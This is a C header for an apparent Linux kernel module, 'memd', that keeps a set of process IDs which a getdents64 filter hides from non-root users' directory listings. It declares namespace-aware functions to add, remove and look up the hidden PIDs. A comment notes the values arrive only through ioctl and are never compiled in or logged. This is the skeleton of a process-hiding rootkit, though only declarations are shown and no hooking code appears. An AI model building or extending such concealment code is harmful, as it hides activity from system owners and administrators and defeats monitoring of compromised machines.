#ifndef MEMD_HIDE_H
#define MEMD_HIDE_H

#include <linux/pid.h>
#include <linux/types.h>

/* Hidden-pid set: which pids the getdents64 filter removes for non-root
 * readers. Values arrive at runtime via ioctl only (never compiled in,
 * never logged). Fixed capacity, no allocations (exit-safe). */
#define MEMD_HIDE_MAX 256

/* Per-PID hide entry with namespace support */
struct memd_hide_entry {
    struct hlist_node node;
    pid_t pid;
    struct pid_namespace *ns;
    struct pid *pid_struct;
    u32 flags;
};

int memd_hide_add(pid_t pid);
int memd_hide_add_ns(pid_t pid, struct pid_namespace *ns);
int memd_hide_del(pid_t pid);
void memd_hide_clear(void);
int memd_hide_count(void);
bool memd_hide_contains(pid_t pid);
bool memd_hide_contains_ns(pid_t pid, struct pid_namespace *ns);
int memd_hide_get_ns_count(struct pid_namespace *ns);
int memd_hide_collect_pids(pid_t *buf, size_t buf_size, size_t *count,
                            struct pid_namespace *ns);
struct memd_hide_entry *memd_hide_get_first(void);
struct memd_hide_entry *memd_hide_get_next(struct memd_hide_entry *entry);

#endif /* MEMD_HIDE_H */
